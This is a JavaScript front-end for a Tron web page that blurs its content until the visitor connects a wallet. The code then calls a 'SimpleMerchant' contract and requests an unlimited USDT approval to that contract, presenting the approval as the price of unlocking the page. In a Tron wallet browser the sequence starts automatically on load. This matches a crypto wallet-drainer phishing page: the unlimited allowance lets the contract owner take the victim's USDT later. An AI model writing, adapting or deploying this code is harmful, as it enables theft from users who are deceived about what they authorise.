// --- 配置常量 (使用你的实际 Tron Base58 地址) ---
const TRON_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 SimpleMerchant 合约地址 (Tron)
const TRC20_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // 你的 USDT TRC20 地址
// const TRC20_USDC_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; // USDC 已注释

const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// **SimpleMerchant 合约的 ABI (紧凑排版)**
const CONTRACT_ABI = [ 
    {"inputs":[],"name":"connectAndAuthorize","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"customer","type":"address"}],"name":"authorized","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
];

// **TRC20 Token JSON ABI (紧凑排版)**
const TRC20_ABI = [
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approveAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"approveAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"transferAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"transferFromAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFromAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];


// --- UI 元素 (保持不变) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); 
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  
const statusDiv = document.getElementById('status');  

// --- 状态变量 (使用 TronWeb 变量) ---
let tronWeb; 
let userAddress; 
let contractInstance; // SimpleMerchant 合约实例
let usdtContractInstance; // USDT TRC20 实例
let isConnectedFlag = false;

// --- 遮罩控制函數 (保持不变) ---
function hideOverlay() {
    if (!overlay) { console.error("Overlay element not found."); return; }
    overlay.style.opacity = '0';
    setTimeout(() => { overlay.style.display = 'none'; }, 300);
}

function showOverlay(message) {
    if (!overlay) { console.error("Overlay element not found."); return; }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
}

// --- 状态更新函数 (修改：连接后只显示图标) ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            // 关键修改：连接成功后，内容就只显示图标
            connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
            const shortAddress = address.length > 8 ? `${address.substring(0, 4)}...${address.slice(-4)}` : address;
            connectButton.title = `Connected: ${shortAddress} (Click to continue or disconnect)`;
            connectButton.classList.remove('authorized-complete'); // 确保初始连接时，没有完成的标记
        } else {
            // 未连接状态
            connectButton.classList.remove('connected', 'authorized-complete');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 (保持不变) ---
function updateStatus(message) {
    if (!statusDiv) { console.error("Status element not found."); return; }
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block';
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
    }
}

// ---  TronWeb 检查授权状态 (只读) ---
async function checkAuthorization() {
    try {
        if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
            updateConnectionUI(false); 
            showOverlay('Wallet not connected. Please connect.');
            return;
        }
        
        // 确保按钮处于连接状态，内容是图标
        updateConnectionUI(true, userAddress); 

        // 1. SimpleMerchant 合约授权检查
        const authorizedResult = await contractInstance.authorized(userAddress).call();
        const isAuthorized = authorizedResult; 
        
        // 2. USDT 授权和余额检查
        const usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
        const usdtAllowance = BigInt(usdtAllowanceRaw);
        const isUsdtMaxApproved = usdtAllowance >= BigInt(ALMOST_MAX_UINT); 
        
        let usdtBalanceRaw = "0";
        try {
            usdtBalanceRaw = await usdtContractInstance.balanceOf(userAddress).call();
        } catch(e) { /* Ignore */ }
        const usdtBalance = BigInt(usdtBalanceRaw);
        const formattedUsdtBalance = (Number(usdtBalance) / 10**6).toFixed(2);


        let statusMessage = '';
        const allAuthorized = isAuthorized && isUsdtMaxApproved; 

        // 构造状态信息
        if (isAuthorized) {
            statusMessage += 'Web page access authorized ✅. ';
        } else {
            statusMessage += 'Web page access not authorized ❌. ';
        }
        statusMessage += `USDT Balance: ${formattedUsdtBalance}. `;
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved ✅.`;
        } else if (usdtAllowance > 0n) {
            statusMessage += `USDT approval needed ⚠️.`;
        } else {
            statusMessage += `USDT not approved ❌.`;
        }


        if (allAuthorized) {
            // **授权完成**：添加绿色标记类
            connectButton.classList.add('authorized-complete'); 
            // 内容已由 updateConnectionUI 设为图标
            connectButton.title = 'Disconnect Wallet'; 
            connectButton.disabled = false;
            updateStatus('All authorizations complete.'); 
            hideOverlay(); 
        } else {
            // **授权未完成**：移除绿色标记类，保持图标，但 CSS 颜色为黄色
            connectButton.classList.remove('authorized-complete'); 
            // 内容已由 updateConnectionUI 设为图标
            
            connectButton.title = 'Complete Authorization'; 
            connectButton.disabled = false;
            updateStatus(`Authorization incomplete. ${statusMessage}`); 
            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner to begin authorization.'); 
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 执行授权交易 ---
async function executeAuthorization() {
    if (!userAddress) { 
        showOverlay('Please connect your wallet first.');
        return;
    }

    try {
        updateStatus('Checking authorization requirements...');
        
        // 1. SimpleMerchant 合约授权
        let isAuthorized = await contractInstance.authorized(userAddress).call();
        if (!isAuthorized) {
            updateStatus('Requesting SimpleMerchant authorization... Please confirm in your wallet.');
            showOverlay('Requesting SimpleMerchant authorization... Please confirm the transaction in your wallet.');
            
            await contractInstance.connectAndAuthorize().send({
                feeLimit: 100000000, 
                callValue: 0,
                shouldPollResponse: true 
            });
            updateStatus(`SimpleMerchant Authorization successful. Checking next step...`);
            isAuthorized = true;
            await new Promise(resolve => setTimeout(resolve, 3000)); 
        }
        
        // 2. USDT 无限授权
        let usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
        let isUsdtMaxApproved = BigInt(usdtAllowanceRaw) >= BigInt(ALMOST_MAX_UINT); 
        
        if (isAuthorized && !isUsdtMaxApproved) { 
            updateStatus('Requesting USDT infinite approval... Please confirm in your wallet.');
            showOverlay('Requesting USDT infinite approval... Please confirm the transaction in your wallet.');
            
            await usdtContractInstance.approve(TRON_CONTRACT_ADDRESS, ALMOST_MAX_UINT).send({
                feeLimit: 100000000, 
                callValue: 0,
                shouldPollResponse: true 
            });
            updateStatus(`USDT Approval successful. Finalizing check...`);
            
            // *** 增加延迟到 5 秒（5000ms）以确保 USDT 授权状态同步完成 ***
            await new Promise(resolve => setTimeout(resolve, 5000));
        }

        // 授权流程完成，检查最终状态并更新 UI
        await checkAuthorization();

    } catch (error) {
        console.error("Authorization Execution Failed:", error);
        const errorMessage = error.message.includes('User cancelled') || error.message.includes('Confirmation declined') ? 
                             'Authorization cancelled by user.' : 
                             `Transaction failed: ${error.message}`;
                             
        updateStatus(`🔴 ${errorMessage}`);
        showOverlay(`🔴 Authorization failed: ${errorMessage}`);
        await checkAuthorization(); 
    }
}


// --- 连接钱包逻辑 (使用 TronWeb 流程) ---
async function connectWallet() {
    try {
        if (typeof window.tronWeb === 'undefined') {
            updateStatus('Please install TronLink or a supported Tron wallet.');
            showOverlay('Please install TronLink or a supported Tron wallet.');
            return;
        }
        
        updateStatus('Connecting to wallet...'); 
        showOverlay('Please ensure your wallet is logged in and connected to this DApp...');
        
        tronWeb = window.tronWeb;
        let localUserAddress = null; // 用于轮询的局部变量

        // **【逻辑：优先非TRONLINK钱包的轮询逻辑】**
        const MAX_RETRIES = 12; 
        const DELAY_MS = 500;
        let retryCount = 0;

        while (!localUserAddress && retryCount < MAX_RETRIES) {
             // TronLink 作为第二顺位尝试
             if (window.tronLink && typeof window.tronLink.request === 'function' && retryCount === 0) {
                 try {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                 } catch (e) {
                     console.warn("TronLink request failed/cancelled. Proceeding with polling.");
                 }
             }
             
            await new Promise(resolve => setTimeout(resolve, DELAY_MS)); 
            
            if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58 && tronWeb.defaultAddress.base58.length > 5) {
                localUserAddress = tronWeb.defaultAddress.base58;
                break;
            }
            retryCount++;
        }

        if (!localUserAddress || localUserAddress === tronWeb.defaultAddress.hex) { 
            throw new Error("Could not retrieve Tron account address after multiple attempts. Please ensure your wallet is connected/logged in.");
        }
        
        // **【关键修复】**：将获取到的地址赋值给全局变量 userAddress
        userAddress = localUserAddress;
        
        console.log("✅ User Address:", userAddress);
        updateConnectionUI(true, userAddress); // 确保此时按钮内容是图标

        // 实例化 SimpleMerchant 合约
        contractInstance = await tronWeb.contract(CONTRACT_ABI, TRON_CONTRACT_ADDRESS);

        // 实例化 TRC20 合约
        usdtContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDT_ADDRESS);

        // 连接成功后，直接进入授权执行流程
        await executeAuthorization(); 

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
}

// --- 处理授权流程 (封装 executeAuthorization) ---
async function handleAuthorization() {
    await executeAuthorization(); 
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    userAddress = null;
    tronWeb = null;
    contractInstance = null;
    usdtContractInstance = null;
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
    updateStatus(''); // 清除状态栏信息
}

// **优化后的事件监听器 (修复了授权未完成时，再次点击按钮被误判为断开连接的问题)**
connectButton.addEventListener('click', () => {
    // 检查是否有用户地址，表示已连接钱包
    if (userAddress) { 
        // 检查按钮的最终状态（通过 title 判断是否为完全授权状态）
        if (connectButton.title === 'Disconnect Wallet') {
            // 已经是完全授权状态，点击执行断开连接
            disconnectWallet(); 
        } else {
            // 已连接，但授权未完成（标题为 'Complete Authorization'），点击继续执行授权流程
            handleAuthorization(); 
        }
    } else { 
        // 钱包未连接，点击执行连接流程
        connectWallet(); 
    }
});

// 页面加载完成后，初始化 
window.onload = () => {
    // 初始设置 UI
    updateConnectionUI(false); 
    // 初始显示遮罩
    showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
    
    // 如果页面是 TronLink 浏览器打开的，尝试自动连接
    if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress.base58) {
        // 等待一小段时间确保 TronWeb 完全加载
        setTimeout(() => {
            if (window.tronWeb.defaultAddress.base58) {
                 connectWallet();
            }
        }, 500); 
    }
};